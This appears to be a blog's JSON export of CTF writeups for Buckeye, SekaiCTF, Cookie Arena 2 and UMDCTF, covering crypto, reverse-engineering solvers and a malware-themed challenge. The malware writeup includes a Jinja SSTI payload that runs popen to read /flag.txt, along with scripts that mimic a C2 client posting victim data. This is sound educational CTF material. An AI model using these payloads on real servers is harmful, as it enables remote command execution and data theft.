{c}\u0026#34;) # OUTPUT: # e = 65537 # n = 34188170446514129546929337540073894418598952490293570690399076531159358605892687 # c = 414434392594516328988574008345806048885100152020577370739169085961419826266692 this is an easy RSA (basic), we have both p, q, n, c, e so we can write script to solve:\n1 2 3 4 5 6 7 8 9 10 11 p = 3782335750369249076873452958462875461053 q = 9038904185905897571450655864282572131579 e = 65537 c = 414434392594516328988574008345806048885100152020577370739169085961419826266692 n = p * q phi = (p - 1) * (q - 1) d = pow(e, -1, phi) m = pow(c, d, n) print(m.to_bytes((m.bit_length() + 7) // 8, \u0026#34;big\u0026#34;)) Secret Code | CRYPTO Here\u0026rsquo;s your flag again: 1:10:d0:10:42:41:34:20:b5:40:03:30:91:c5:e1:e3:d2:a2:72:d1:61:d0:10:e3:a0:43:c1:01:10:b1:b1:b0:b1:40:9 LOL you snub_wrestle. Good luck trying to undo my xor key I used on each character of the flag.\nI think this is easy chall about xor\nFirst, we must remove : from the encryp, it gives us: 110d01042413420b540033091c5e1e3d2a272d161d010e3a043c10110b1b1b0b1409, then convert from hex to byte \u0026amp; xor with snub_wrestle to get flag\n","date":"2023-10-02T00:00:00Z","image":"/p/buckeye-ctf-2023-writeups/featured-image_hu5fad3dab004c0aa4880db40f68baffb0_36302_120x120_fill_box_smart1_3.png","permalink":"/p/buckeye-ctf-2023-writeups/","title":"Buckeye CTF 2023 | Writeups"},{"content":"Unfortunately, during the tournament, I was tricked into debugging the Teyvat Travel Guide challenge, which led me to go the wrong way and give up while making myself feel like I had no hope (when it was really only at medium level):\u0026lt; and lost. Quite a bit of effort for the Guardians of the Kernel challenge\nAzusawa‚Äôs Gacha World Author: enscribe\n‚ùñ Note The website only contains the challenge description, and is not needed to solve the challenge.\nChallenge structure analysis In the first challenge, I received a full folder of Sekai\u0026rsquo;s Gacha game (Created by Unity)\nWhile searching through folders, I found a file named Assembly-CSharp.dll\nKnowing it was related to Csharp, I loaded it into DnSpy to get started. Luckily, this file is not too complicated, the information is clear.\n1. Character\n2. GachaRequest\n3. GachaResponse\nReading these 3 classes, I concluded that when I gacha, I will send the parameters in GachaRequest including crystals, pulls and numPulls to the server and receive GachaResponse containing the class character and which includes flag\nWhere does the server receive requests? 4. CreateGachaWebRequest\n1 2 3 4 5 6 7 8 9 10 11 12 13 // GachaManager // Token: 0x06000016 RID: 22 RVA: 0x0000259C File Offset: 0x0000079C private UnityWebRequest CreateGachaWebRequest(string json) { byte[] bytes = Encoding.UTF8.GetBytes(json); string s = \u0026#34;aHR0cDovLzE3Mi44Ni42NC44OTozMDAwL2dhY2hh\u0026#34;; UnityWebRequest unityWebRequest = new UnityWebRequest(Encoding.UTF8.GetString(Convert.FromBase64String(s)), \u0026#34;POST\u0026#34;); unityWebRequest.uploadHandler = new UploadHandlerRaw(bytes); unityWebRequest.downloadHandler = new DownloadHandlerBuffer(); unityWebRequest.SetRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;); unityWebRequest.SetRequestHeader(\u0026#34;User-Agent\u0026#34;, \u0026#34;SekaiCTF\u0026#34;); return unityWebRequest; } aHR0cDovLzE3Mi44Ni42NC44OTozMDAwL2dhY2hh l√† m√£ ho√° base64 c·ªßa http://172.86.64.89:3000/gacha\nYah, so I have found a server + some payload setup, here I can solve it with burpsuite or send it via shell :\u0026raquo;, I choose via shell for convenience\nP/s: There is also an option for game-style challs like this: Cheat Engine is quite simple, it can determine the exact address of the objects and modify them (in this writeup I will not mention it because it is not pure REV)\nGacha time So, based on what I analyze, I can write a shell curl to retrieve data like I\u0026rsquo;m gacha with the example parameters being 1000, 1, 1. (ie I have 1000 diamonds, new spin 1 time and spin 1 more time)\n1 curl -s -X POST http://172.86.64.89:3000/gacha -d \u0026#39;{\u0026#34;crystals\u0026#34;:1,\u0026#34;pulls\u0026#34;:1,\u0026#34;numPulls\u0026#34;:1}\u0026#39; -H \u0026#39;Content-type: application/json\u0026#39; -H \u0026#39;User-Agent: SekaiCTF\u0026#39; | jq . Maybe I still need to open the game to check what the parameters are\nYah, here it is, the chance of winning gacha is 0% and can only be received when spinning 1 million times :)). So it\u0026rsquo;s simple, because the number of spins per request is only between 1 and 10, so setup pulls will be 999999 and numPulls will be 1, and crystals will be set to 1000.\nPut the jumbled part into cyberchef with base64 and convert it to an image\nflag: SEKAI{D0N7_73LL_53G4_1_C0P13D_7H31R_G4M3}\nGuardians of the Kernel Author: Iyed\n‚ùñ Note It‚Äôs just a warmup but with another layer which is the kernel.\nChallenge analysis In this chall, I received an attachment consisting of 2 quite strange files\nAfter researching, I understand that bzImage is a kernel image file that loads and initializes the kernel while booting the system and the .cpio file is like a file system restorer (because it manages data structures and file lists)\nSo I can completely build the kernel image (here I can use qemu), but this build chall is a bit redundant (I don\u0026rsquo;t need debug).\nWe an easily run this kernel with the command:\n1 qemu-system-x86_64 -kernel bzImage -initrd initramfs.cpio -nographic -monitor none -no-reboot -append \u0026#34;console=ttyS0\u0026#34; Instead, I decompress the files in initramfs.cpio with the command: cpio -idv -F inittramfs.cpio\nNotice that there is a file flag_checker.ko (this file contains information about loading modules into the kernel), so maybe I won\u0026rsquo;t need to debug through the kernel anymore, I\u0026rsquo;ll just load it into IDA\nGreat, there is device_ioctl that handles I/O Control, so I exploited this part and bonus\nThe main stream\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 __int64 __fastcall device_ioctl(__int64 a1, int a2, __int64 a3) { __int64 result; // rax unsigned __int8 *v6; // rax int v7; // edx int v8; // eax unsigned int v9; // eax __int64 v10; // rdx if ( a2 == 28673 ) { if ( !layers[1] ) return 0LL; if ( !copy_from_user(buffer, a3, 7LL) ) { buffer[7] = 0; v6 = buffer; while ( (unsigned __int8)(*v6 - 48) \u0026lt;= 9u ) { if ( \u0026amp;buffer[7] == ++v6 ) { v7 = 7 * __ROL4__(1507359807 * __ROR4__(422871738 * *(_DWORD *)buffer, 15), 11); v8 = __ROR4__(422871738 * ((buffer[5] \u0026lt;\u0026lt; 8) ^ (buffer[6] \u0026lt;\u0026lt; 16) ^ buffer[4]), 15); v9 = 1984242169 * ((v7 + 1204333666) ^ (1507359807 * v8) ^ 7 ^ (((v7 + 1204333666) ^ (unsigned int)(1507359807 * v8)) \u0026gt;\u0026gt; 16)); if ( (((-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026gt;\u0026gt; 16) ^ (-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9))) != 261736481 ) return 0LL; return device_ioctl_cold(); } } return 0LL; } return -14LL; } if ( a2 == 28674 ) { if ( !layers[2] ) return 0LL; v10 = copy_from_user(buffer, a3, 12LL); if ( !v10 ) { do { buffer[v10] += buffer[v10 + 1] * ~(_BYTE)v10; ++v10; } while ( v10 != 12 ); if ( *(_QWORD *)buffer != 0x788C88B91D88AF0ELL || *(_DWORD *)\u0026amp;buffer[8] != 2113081836 || buffer[12] ) return 0LL; printk(\u0026amp;unk_2EB, a3); return 1LL; } return -14LL; } if ( a2 != 28672 ) { printk(\u0026amp;unk_302, a3); return 0LL; } if ( copy_from_user(buffer, a3, 6LL) ) return -14LL; if ( *(_DWORD *)buffer != 1095451987 || *(_WORD *)\u0026amp;buffer[4] != 31561 ) return 0LL; printk(\u0026amp;unk_2B6, a3); result = 1LL; layers[1] = 1; return result; } As in the text view, we can see that the format of the flag is SEKAI{, then that is the end of the stream \u0026lt;\u0026ndash; Change the value from dec to char for clearer display\n1 if ( *(_DWORD *)buffer != \u0026#39;AKES\u0026#39; || *(_WORD *)\u0026amp;buffer[4] != \u0026#39;{I\u0026#39; ) Processing layer 1 Maybe this is the part that takes up all my time during the tournament :)))), being lazy should be punished by God :(\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 if ( !copy_from_user(buffer, a3, 7LL) ) { buffer[7] = 0; v6 = buffer; while ( (unsigned __int8)(*v6 - 48) \u0026lt;= 9u ) { if ( \u0026amp;buffer[7] == ++v6 ) { v7 = 7 * __ROL4__(1507359807 * __ROR4__(422871738 * *(_DWORD *)buffer, 15), 11); v8 = __ROR4__(422871738 * ((buffer[5] \u0026lt;\u0026lt; 8) ^ (buffer[6] \u0026lt;\u0026lt; 16) ^ buffer[4]), 15); v9 = 1984242169 * ((v7 + 1204333666) ^ (1507359807 * v8) ^ 7 ^ (((v7 + 1204333666) ^ (unsigned int)(1507359807 * v8)) \u0026gt;\u0026gt; 16)); if ( (((-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026gt;\u0026gt; 16) ^ (-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9))) != 261736481 ) return 0LL; return device_ioctl_cold(); } } return 0LL; } After writing a lot of failed solutions using rev, I switched to bruteforce.\nIt can be seen that layer 1 contains 7 chars, the algorithm is a bit complicated (and still confused between signed and unsigned type), so I will bruteforce this quickly (actually, while thinking about how to write bruteforce, I can finish the third rev challenge üêß)\nscript bruteforce:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def __ROL4__(val, bits, bit_size=32): return (val \u0026lt;\u0026lt; bits % bit_size) \u0026amp; (2 ** bit_size - 1) | ((val \u0026amp; (2 ** bit_size - 1)) \u0026gt;\u0026gt; (bit_size - (bits % bit_size))) def __ROR4__(val, bits, bit_size=32): return ((val \u0026amp; (2 ** bit_size - 1)) \u0026gt;\u0026gt; bits % bit_size) | (val \u0026lt;\u0026lt; (bit_size - (bits % bit_size)) \u0026amp; (2 ** bit_size - 1)) for i in range(10000000): f = str(i).rjust(7, \u0026#39;0\u0026#39;).encode() tmp = (f[3] \u0026lt;\u0026lt; 24) | (f[2] \u0026lt;\u0026lt; 16) | (f[1] \u0026lt;\u0026lt; 8) | f[0] v7 = 7 * __ROL4__(1507359807 * __ROR4__(422871738 * tmp, 15), 11) v8 = __ROR4__(422871738 * ((f[5] \u0026lt;\u0026lt; 8) ^ (f[6] \u0026lt;\u0026lt; 16) ^ f[4]), 15) v9 = 1984242169 * (((v7 + 0x47C8AC62) \u0026amp; 0xFFFFFFFF) ^ ((1507359807 * v8) \u0026amp; 0xFFFFFFFF) ^ 7 ^ ((((v7 + 0x47C8AC62) \u0026amp; 0xFFFFFFFF) ^ ((1507359807 * v8) \u0026amp; 0xFFFFFFFF)) \u0026gt;\u0026gt; 16)) v9 \u0026amp;= 0xFFFFFFFF if ((((2477530742 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026amp; 0xFFFFFFFF) \u0026gt;\u0026gt; 16) ^ ((2477530742 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026amp; 0xFFFFFFFF)) == 261736481: print(f) \u0026ndash;\u0026gt; 6001337\nThe solution other with z3 makes me bitter\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from z3 import * buffer = [BitVec(f\u0026#39;x{i}\u0026#39;, 8) for i in range(7)] _buffer = buffer[:] buffer = [ZeroExt(24, x) for x in buffer] v8 = 7 * RotateLeft(1507359807 * RotateRight(422871738 * Concat(*_buffer[:4][::-1]), 15), 11) v9 = RotateRight(422871738 * ((buffer[5] \u0026lt;\u0026lt; 8) ^ (buffer[6] \u0026lt;\u0026lt; 16) ^ buffer[4]), 15) v10 = 1984242169 * ((v8 + 1204333666) ^ (1507359807 * v9) ^ 7 ^ LShR((v8 + 1204333666) ^ (1507359807 * v9), 16)) s = Solver() s.add([And(x \u0026gt;= 0x30, x \u0026lt;= 0x39) for x in _buffer]) shr13 = (LShR(v10, 13) ^ v10) s.add((LShR((-1817436554 * shr13), 16) ^ (-1817436554 * shr13)) == 261736481) print(bytes([s.model()[x].as_long() for x in _buffer])) Check layer 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 v10 = copy_from_user(buffer, a3, 12LL); if ( !v10 ) { do { buffer[v10] += buffer[v10 + 1] * ~(_BYTE)v10; ++v10; } while ( v10 != 12 ); if ( *(_QWORD *)buffer != 0x788C88B91D88AF0ELL || *(_DWORD *)\u0026amp;buffer[8] != 2113081836 || buffer[12] ) return 0LL; printk(\u0026amp;unk_2EB, a3); return 1LL; } Layer 2, although it has 12 char, is easier to solve. Here, we will have 1 more hint to make solving easier, that the last character will be \u0026ldquo;}\u0026rdquo; :\u0026gt;\nThere are also other conditions:\nbuffer[i] += buffer[i + 1] * ~(_BYTE)v10; (i from 0 to 12) buffer[12] = 0 so buffer[11] = \u0026lsquo;}\u0026rsquo; Based on this, I can build the code through z3:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 def solve_buffer(): s = Solver() buffer = [BitVec(i, 8) for i in range(13)] buffer_ = [BitVec(i, 8) for i in range(13)] for i in range(12): buffer_[i] = buffer[i] + buffer[i + 1] * ~BitVecVal(i, 8) for i in range(12): s.add(And(buffer[i] \u0026gt;= 0x20, buffer[i] \u0026lt;= 0x7e)) s.add(Concat(buffer_[7], buffer_[6], buffer_[5], buffer_[4], buffer_[3], buffer_[2], buffer_[1], buffer_[0]) == 0x788C88B91D88AF0E) s.add(Concat(buffer_[11], buffer_[10], buffer_[9], buffer_[8]) == 2113081836) if s.check() == sat: x = s.model() result = [] for i in range(13): result.append(int(str(x[buffer[i]]))) return result else: return None def main(): result = solve_buffer() print(\u0026#39;\u0026#39;.join(chr(val) for val in result)) if __name__ == \u0026#34;__main__\u0026#34;: main() \u0026ndash;\u0026gt; SEKAIPL@YER}\nflag: SEKAI{6001337SEKAIPL@YER}\nSekaiCTF 2023 - REV Reviews The reverse challenges of SekaiCTF are diverse, new + extremely difficult If I let myself play only one topic, I\u0026rsquo;ll probably cry, so I should play a few more to keep rank :\u0026lt; The most unfortunate thing about this tournament is probably not re3 but the lack of pwn1 (wasting too much time doing pwn2), that\u0026rsquo;s all, stopping at top xx/981 is good, next year I will take revenge: \u0026gt; ","date":"2023-08-27T00:00:00Z","image":"/p/sekaictf-2023-reverse-engineering/featured-image_hu53ff5d738f6f6b8e65c2845372b95fb7_671573_120x120_fill_box_smart1_3.png","permalink":"/p/sekaictf-2023-reverse-engineering/","title":"SekaiCTF 2023 | Reverse Engineering"},{"content":"Pyreverse Trong qu√° tr√¨nh ph√¢n t√≠ch c√°c Tool Auto Game, ch√∫ng m√¨nh ph√°t hi·ªán ra k·ªπ thu·∫≠t kh√° ph·ªï bi·∫øn trong vi·ªác vi·∫øt m√£ v√† ƒë√≥ng g√≥i ch∆∞∆°ng tr√¨nh. H√£y t√¨m ra k·ªπ thu·∫≠t n√†y v√† t√¨m c√°ch d·ªãch ng∆∞·ª£c ch√∫ng, FLAG b√≠ m·∫≠t ·∫©n ƒë∆∞·ª£c ·∫©n ch·ª©a b√™n trong.\nS·ª≠ d·ª•ng pydumpck ƒë·ªÉ decompile exe \u0026ndash;\u0026gt; py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # pyreverser.pyc.cdc.py import base64 def reverse_string(s): return s[::-1] def scramble_flag(flag): scrambled = \u0026#39;\u0026#39; for i, char in enumerate(flag): if i % 2 == 0: scrambled += chr(ord(char) + 1) continue scrambled += chr(ord(char) - 1) return scrambled def main(): print(base64.b64decode(\u0026#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==\u0026#39;)) secret_flag = scramble_flag(reverse_string(base64.b64decode(\u0026#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==\u0026#39;)).decode()) print(\u0026#39;Welcome to PyReverser!\u0026#39;) print(\u0026#39;Please enter a word or phrase:\u0026#39;) user_input = input() generated_value = scramble_flag(reverse_string(user_input.upper())) print(\u0026#39;Generated value:\u0026#39;, generated_value) print(\u0026#39;Can you find the hidden flag?\u0026#39;) reversed_flag = reverse_string(secret_flag) print(\u0026#39;Reversed flag:\u0026#39;, reversed_flag) if __name__ == \u0026#39;__main__\u0026#39;: main() ƒê·ªÉ √Ω flag ƒë∆∞·ª£c decode t·ª´ ƒëo·∫°n base64 b√™n tr√™n\n1 2 root@Spid3r:~# echo \u0026#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==\u0026#39; | base64 -d CHH{python2Exi_Reverse_ENginering} Jump Th·ª≠ th√°ch m√¥ ph·ªèng l·∫°i thu·∫≠t to√°n sinh key b·∫£n quy·ªÅn ph·∫ßn m·ªÅm, h√£y ch·∫°y th·ª≠ file ch∆∞∆°ng tr√¨nh v√† d·ªãch ng∆∞·ª£c ch√∫ng ƒë·ªÉ t√¨m FLAG ·∫©n ch·ª©a b√™n trong‚Äã\nPh√¢n t√≠ch file ƒê·ªÉ √Ω r·∫±ng ƒë√¢y ch·ªâ l√† 1 file exe c√≥ th·ªÉ decompile 1 c√°ch ƒë∆°n gi·∫£n (·ªû ƒë√¢y th√¨ m√¨nh ch·∫≥ng th·∫•y c√≥ ch·ªó n√†o g·ªçi l√† sinh key b·∫£n quy·ªÅn ph·∫ßn m·ªÅm c·∫£)\nL·ª£i d·ª•ng ch·∫°y h√†m _flag b·∫±ng c√°ch nh·∫≠p ‚Äãƒë·ªãa ch·ªâ _flag v√†o √¥ nh·∫≠p khi ch·∫°y jump.exe\nT√¨m ƒë·ªãa ch·ªâ _flag v√† l·∫•y flag C√°ch 1 (t√¨m tr·ª±c ti·∫øp ƒë·ªãa ch·ªâ _flag th√¥ng qua ƒëo·∫°n m√£ ƒë∆∞·ª£c dump) C√°ch 2 (S·ª≠ d·ª•ng edit function ƒë·ªÉ ki·ªÉm tra ƒë·ªãa ch·ªâ h√†m flag) L∆∞u √Ω: ƒë·ªãa ch·ªâ 00401500 ƒëang ·ªü hexa \u0026ndash;\u0026gt; ƒë·ªïi sang decimal l√† 4199680‚Äã\nRev1 Th·ª≠ th√°ch m√¥ ph·ªèng l·∫°i thu·∫≠t to√°n sinh key b·∫£n quy·ªÅn ph·∫ßn m·ªÅm, h√£y ch·∫°y th·ª≠ file ch∆∞∆°ng tr√¨nh v√† d·ªãch ng∆∞·ª£c ch√∫ng ƒë·ªÉ t√¨m FLAG ·∫©n ch·ª©a b√™n trong.\nPh√¢n t√≠ch file PE32 \u0026ndash;\u0026gt; 32 bits\nGUI \u0026ndash;\u0026gt; WinMain\nWinMain X·ª≠ l√Ω I/O Ki·ªÉm tra trong DialogBoxParamA\nH√†m GetItemTextA s·∫Ω l·∫•y c√°c string ƒë∆∞·ª£c input v√†o v√† check key qua sub_402030\nKi·ªÉm tra h√†m n√†y th√¨ th·∫•y r·∫±ng dword_414448 ch∆∞a ƒë∆∞·ª£c kh·ªüi t·∫°o v√¨ v·∫≠y ch√∫ng ta s·∫Ω debug ƒë·ªÉ xem n√≥ l√† g√¨ (xem video d∆∞·ªõi ƒë√¢y)\nDebug Your browser doesn't support HTML5 video. Here is a\rlink to the video instead.\rD·ª±a v√†o nh·ªØng g√¨ debug ƒë∆∞·ª£c c√≥ th·ªÉ vi·∫øt l·∫°i ƒëo·∫°n code d∆∞·ªõi ƒë√¢y:\nƒê·∫øn ƒë√¢y th√¨ ch·ªâ ƒë∆°n gi·∫£n l√† d√πng z3 ƒë·ªÉ vi·∫øt script gi·∫£i solve_rev1.py ƒë·ªÉ l·∫•y key\nCV Malware Th·ªùi gian g·∫ßn ƒë√¢y c√≥ nhi·ªÅu h√¨nh th·ª©c x√¢m nh·∫≠p v√†o m√°y t√≠nh n·∫°n nh√¢n th√¥ng qua m√£ ƒë·ªôc ƒë∆∞·ª£c g·∫Øn trong file Word. Khi m√£ ƒë·ªôc th·ª±c thi, ch√∫ng s·∫Ω l·∫•y th√¥ng tin c·ªßa n·∫°n nh√¢n ƒë·ªÉ g·ª≠i v·ªÅ m√°y ch·ªß ƒëi·ªÅu khi·ªÉn C\u0026amp;C. Li·ªáu hacker c≈©ng c√≥ th·ªÉ th·ªÉ b·ªã hack, h√£y c√πng ƒëi sƒÉn k·∫ª x·∫•u nh√©!\nMang ti·∫øng Malware nh∆∞ng l√† b√†i duy nh·∫•t rev t·∫£i v·ªÅ kh√¥ng b·ªã Windows t·ª± ƒë·ªông ph√°t hi·ªán v√† xo√° :))\nPh√¢n t√≠ch file D·ª±a v√†o ki·ªÉm tra header c·ªßa file th√¨ linux cho r·∫±ng ƒë√¢y l√† 1 file Word (nh∆∞ng th·ª±c ch·∫•t Word ƒë∆∞·ª£c c·∫•u t·∫°o nh∆∞ 1 file Zip)\nUnzip \u0026amp; check T·ª´ ƒë√¢y m√¨nh ti·∫øn h√†nh gi·∫£i n√©n \u0026ldquo;file zip\u0026rdquo; n√†y ra v√† ki·ªÉm tra xem n√≥ c√≥ g√¨ l·∫° hay kh√¥ng (Ch√∫ √Ω ƒë·∫øn c√°c file xml xu·∫•t hi·ªán trong b·∫£n gi·∫£i n√©n n√†y)\nQua vi·ªác nh√¨n b·∫±ng m·∫Øt th∆∞·ªùng th√¨ c≈©ng th·∫•y r·∫±ng ƒëo·∫°n XML n√†y th·ª±c ra ƒë∆∞·ª£c m√£ h√≥a t·ª´ hexa v√† base64, m√¨nh s·∫Ω ti·∫øn h√†nh decode n√≥\nDecode 1 2 3 server: host: http://REPLACE_HOST_HERE secret: SecR3TtOKen Nh√¨n qua th√¨ ƒë√¢y l√† gi·ªëng nh∆∞ 1 ch·ªâ d·∫´n v·ªÅ host v√† m·∫≠t kh·∫©u c·ªßa server ƒë·ªÉ file n√†y t∆∞∆°ng t√°c v·ªõi n√≥ th√¨ ph·∫£i\nD·ª±a v√†o header MZ c·ªßa ƒëo·∫°n base64 ƒë∆∞·ª£c decode kia th√¨ c√≥ th·ªÉ ƒëo√°n ƒë∆∞·ª£c ƒë√¢y l√† 1 file exe tr√™n Windows, export v·ªÅ v√† load v√†o IDA ƒë·ªÉ ki·ªÉm tra xem n√≥ c√≥ g√¨ n√†o\nmain Nh√¨n k·ªπ 1 ch√∫t th√¨ ·ªü ƒë√¢y c√≥ h√†m downloadFile v·ªõi tham s·ªë l√† REPLACE_HOST_HERE, ki·ªÉm tra tr·ª±c ti·∫øp n√≥ th√¨ th·∫•y ƒë∆∞·ª£c ƒëo·∫°n ph∆∞∆°ng th·ª©c GET client.exe t·ª´ /static v·ªÅ\nV·ªõi host m·∫∑c ƒë·ªãnh c·ªßa challenge th√¨ ch·∫Øc ch·∫Øn s·∫Ω l·∫•y file t·ª´ http://103.97.125.53:31040/static/client.exe‚Äã truy c·∫≠p v√†o ƒë√≥ v√† l·∫•y file v·ªÅ, c√≥ th·ªÉ ƒë√¢y l√† ph∆∞∆°ng th·ª©c giao ti·∫øp gi·ªØa ng∆∞·ªùi b·ªã h·∫°i v√† server.\nclient.exe ƒê√¢y l√† 1 file ƒë∆∞·ª£c vi·∫øt b·ªüi Golang, d·∫°o g·∫ßn ƒë√¢y m√¨nh th·∫•y c√°c challenge ki·ªÉu t∆∞∆°ng t√°c gi·ªØa client v√† server ƒë∆∞·ª£c d√πng r·∫•t nhi·ªÅu\nLoad file v√†o IDA\nD·ª±a v√†o c√°ch ƒë·∫∑t t√™n th√¨ c√≥ th·ªÉ ƒëo√°n ƒë∆∞·ª£c:\nmain_getSystemInfo() l√† h√†m l·∫•y c√°c th√¥ng tin c·ªßa m√°y n·∫°n nh√¢n main_sendPostRequest() l√† h√†m g·ª≠i ƒëi c√°c th√¥ng tin l·∫•y ƒë∆∞·ª£c (client.exe s·∫Ω t∆∞∆°ng t√°c v·ªõi host) C√≤n v·ªÅ h√†m main_loadAllConfigs() th√¨ m√¨nh ch∆∞a h√¨nh dung ra ƒë∆∞·ª£c n√≥ s·∫Ω l√†m g√¨, c√≥ th·ªÉ l√† li√™n quan ƒë·∫øn vi·ªác config n√†o ƒë√≥ cho ph√≠a server hi·ªÉu ƒë∆∞·ª£c v√† l√∫c n√†y th√¨ c√≥ th·ªÉ ƒë·ªÉ √Ω ƒë·∫øn ƒëo·∫°n ch·ªâ d·∫´n v·ªÅ host v√† secret ban n√£y main_loadAllConfigs(): Khi ƒë·ªÉ file config c√πng trong th∆∞ m·ª•c v·ªõi client.exe th√¨ c√≥ th·∫•y l·ªói v·ªÅ ini \u0026ndash;\u0026gt; ƒë·ªïi th√†nh config.ini v√† chuy·ªÉn host: http://103.97.125.53:31040\nB·∫Øt t∆∞∆°ng t√°c gi·ªØa client v·ªõi host th√¥ng qua Wireshark T·ª´ ƒë√¢y c√≥ th·ªÉ th·∫•y client g·ª≠i c√°c th√¥ng tin v·ªÅ username, hostname t·ª´ ph√≠a client ƒë·ªìng th·ªùi c√πng v·ªõi secret: SecR3TtOken l√™n server v√† ƒë∆∞·ª£c tr·∫£ v·ªÅ Logged username hostname\nT·ª´ ƒë√¢y c√≥ th·ªÉ vi·∫øt 1 ƒëo·∫°n script m√¥ ph·ªèng vi·ªác g·ª≠i th√¥ng tin v√† nh·∫≠n th√¥ng tin gi·ªØa client v√† server nh∆∞ sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import request url = \u0026#34;http://103.97.125.53:31040\u0026#34; header = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Go-http-server/1.1\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Secret\u0026#34;: \u0026#34;SecR3Ttoken\u0026#34; } payload = { \u0026#34;username\u0026#34;: \u0026#34;SPID3R-MSI\\Spid3r\u0026#34;, \u0026#34;hostname\u0026#34;: \u0026#34;Spider-msi\u0026#34; } response = requests.post(url, headers=headers, json=payload) print(response.text) # Logged SPID3R-MSI\\Spid3r Spid3r-msi V·∫≠y th√¨ ƒë√£ gi·∫£i quy·∫øt xong vi·ªác k·∫øt n·ªëi \u0026ldquo;nh√¢n t·∫°o\u0026rdquo; gi·ªØa client v√† server th√¥ng qua ƒëo·∫°n script tr√™n\nd·ª±a v√†o hint m√† n·∫øu kh√¥ng ƒë∆∞a ra th√¨ kh√¥ng ai bi·∫øt m√† gi·∫£i n·ªïi ƒë·∫øn t·ª´ t√°c gi·∫£ FLAG n·∫±m tr√™n host, t√¨m c√°ch k·∫øt n·ªëi ƒë√∫ng v√† exploit\nth√¨ b√¢y gi·ªù vi·ªác quan tr·ªçng nh·∫•t s·∫Ω l√† ƒëi t√¨m l·ªói tr√™n server ƒë·ªÉ d·ª±a v√†o vi·ªác khai th√°c n√≥ v√† l·∫•y flag\nMay th·∫≠t, th·ª≠ ph√°t ƒë·∫ßu th√¨ d√≠nh ƒë√©t l·ªói SSTI lu√¥n, vi·ªác cu·ªëi c√πng ch·ªâ l√† vi·∫øt payload ƒë·ªÉ get flag tr·ª±c ti·∫øp t·ª´ server th√¥i\nScript gi·∫£i:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import request url = \u0026#34;http://103.97.125.53:31040\u0026#34; header = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Go-http-server/1.1\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Secret\u0026#34;: \u0026#34;SecR3Ttoken\u0026#34; } payload = { \u0026#34;username\u0026#34;: \u0026#34;{{url_for.__globals__.os.__dict__.popen(\u0026#39;cat /flag.txt).read()}}\u0026#34;, \u0026#34;hostname\u0026#34;: \u0026#34;Spider-msi\u0026#34; } response = requests.post(url, headers=headers, json=payload) print(response.text) # Logged CHH{ExtR@Ct_m4CRo_aNd_h@Ck_C2c_d791e9a6f418993651267fbae56e3c46} Spid3r-msi ","date":"2023-07-09T00:00:00Z","image":"/p/cookie-arena-2-reverse-engineering/featured_hu1d606a7f3123979285701cf8aea1cd37_774107_120x120_fill_box_smart1_3.png","permalink":"/p/cookie-arena-2-reverse-engineering/","title":"Cookie Arena 2 | Reverse Engineering"},{"content":"Information UMDCTF 2023 starts at 5:00 AM on April 29, 2023, and ends at 5:00 AM on May 1, 2023 (which is not at all suitable for someone like me who loves to sleep in). The challenges in this competition revolve around Pokemon.\nRanking Our team ranked 17th/745 teams with 12,799 points. Detail of scoreboard here\nIt\u0026rsquo;s a bit disappointing that during the competition, I couldn\u0026rsquo;t fully solve the Forensics challenges. By around 5 AM, when the competition ended, I was too exhausted to continue thinking.\nIn this writeup, I will provide solutions for the challenges in ascending order based on their increasing point values.\nMalware Chall Disclaimer This challenge provided hint to the Doctor Hate Him challenge, and I\u0026rsquo;ll discuss that later. Here, they have given the flag.\nUMDCTF{i_understand_that_malware_chall_is_sus}\nMirror Unknown Here we have received a picture (.png file).\nUsing Google Images, we found a cipher alphabet chart.\nThen we put the words obtained into the format of the flag: UMDCTF{} and add the note: Ancient civilizations didn\u0026rsquo;t believe in whitespace or lowercase\nUMDCTF{SINJOHRUINS}\nNo. 352 Here, there is a mention of password 1 and password 2, which made me think of the steghide tool (pay attention to password 1, which is the name of Pokemon number 352 - written in lowercase).\npassword 1: kecleon\n1 2 3 4 ‚îå‚îÄ‚îÄ(kali„âøSpid3r)-[~/Downloads] 